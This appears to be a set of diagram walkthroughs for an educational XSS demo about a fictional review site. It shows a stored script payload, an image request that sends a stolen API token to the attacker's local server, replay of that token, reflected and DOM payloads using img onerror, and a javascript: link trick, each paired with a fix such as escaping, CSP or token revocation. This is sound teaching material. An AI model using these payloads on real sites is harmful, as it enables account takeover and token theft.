1. Flow diagram

From "Vikram typed something" to "his script runs as KhaanaReview", and every place it can be stopped. Each layer is a separate chance to win.

How to read it

  1. The review is saved as typed (yellow). That's correct: the escaping depends on where it's shown later.
  2. Escaping is the real fix: the script becomes visible text.
  3. If someone forgets to escape, a nonce-based CSP still stops the browser from running it.
  4. Only with both layers missing does the script run. Then HttpOnly decides what it can take away, but not what it can do while the tab is open.
  5. Server-side revocation on logout is the last chance to kill a stolen token.

Every red box was reproduced in the demo's browser test. Every green box too.

2. Data flow

Stored XSS on /vulnerable/reviews, with the real values from our test run.

sequenceDiagram
    autonumber
    actor V as Vikram
    participant K as KhaanaReview (localhost:3048)
    participant B as Rahul's browser
    participant X as Vikram's server (127.0.0.1:3049)

    V->>K: POST /reviews { text: "Great food! #lt;script src=x.js#gt;" }
    K-->>V: 201 saved as typed
    B->>K: POST /login (Rahul)

    Note over B: page stores apiToken in localStorage (the bad habit)
    B->>K: GET /vulnerable/reviews
    K-->>B: HTML with the raw #lt;script src=...x.js#gt; (no CSP header)
    B->>X: GET /x.js
    X-->>B: the attacker's script
    Note over B: runs as KhaanaReview: document.cookie = "" (HttpOnly) but localStorage has the token
    B->>X: GET /collect?d={ apiToken: "Ew0oYhoq…", documentCookie: "" } (an img request)
    B->>K: POST /reviews "Vikram's Biryani House is the best!" (cookie sid attached)
    K-->>B: 201 review saved as Rahul 😱
    V->>K: GET /api/me (Authorization: Bearer Ew0oYhoq…)
    K-->>V: 200 { email: Rahul's, via: "Bearer token" } 😱
    B->>K: POST /logout (Rahul)
    Note over K: delete session AND all of Rahul's API tokens
    V->>K: GET /api/me (Bearer Ew0oYhoq…)
    K-->>V: 401 Not signed in ✓

How to read it

  1. Each column is one party. Solid arrows are requests, dashed arrows are replies.
  2. Steps 1–2: the payload sits harmlessly in the database until someone renders it raw.
  3. Step 4: two credentials. The sid cookie is HttpOnly; the apiToken goes to JavaScript.
  4. Steps 5–8: no escaping and no CSP, so the browser fetches and runs Vikram's script with KhaanaReview's authority.
  5. Step 9: an image request carries the loot out. No CORS is needed to send.
  6. Step 10: the script can't read sid, but the browser attaches it anyway: HttpOnly limits theft, not actions.
  7. Steps 12–16: the stolen token works from anywhere, until the server revokes it.

3. The three kinds of XSS

Different roads, same destination: the attacker's code running as your site. The fix for each is on the right.

Script runs The fix 
flowchart LR
    S1(["Stored: review with a script"]) --> S2["Saved in the database"]
    S2 --> S3["Server builds every visitor's page with it"]
    R1(["Reflected: link to /search?q=#lt;img onerror#gt;"]) --> R2["Victim clicks the link"]
    R2 --> R3["Server echoes q into the page"]
    D1(["DOM: link to /welcome with #lt;img onerror#gt; after the hash"]) --> D2["Victim clicks the link"]
    D2 --> D3["Page's own JS: el.innerHTML = location.hash"]
    S3 --> RUN[/"Script runs as your site"/]
    R3 --> RUN
    D3 --> RUN
    S3 -. fix .-> F1["Escape on output + CSP"]
    R3 -. fix .-> F1
    D3 -. fix .-> F2["textContent, or DOMPurify + CSP"]

    classDef error fill:#fee2e2,stroke:#dc2626,color:#7f1d1d
    classDef ok fill:#dcfce7,stroke:#16a34a,color:#14532d
    class RUN error
    class F1,F2 ok

How to read it

  1. Stored hits everyone who opens the page, with no click needed. The most dangerous kind.
  2. Reflected needs the victim to open a crafted link (email, chat). The server copies the request into the response.
  3. DOM-based is a frontend bug: the server sends the same safe page every time, and the page's own JavaScript puts URL data into innerHTML. Data after the hash never even reaches the server.
  4. The first two are fixed on the server (escaping); the third in the browser code (textContent). CSP backs up all three.

Also in the demo: a javascript: link in the "website" field. Escaping doesn't stop it; only an http(s) allow-list does.
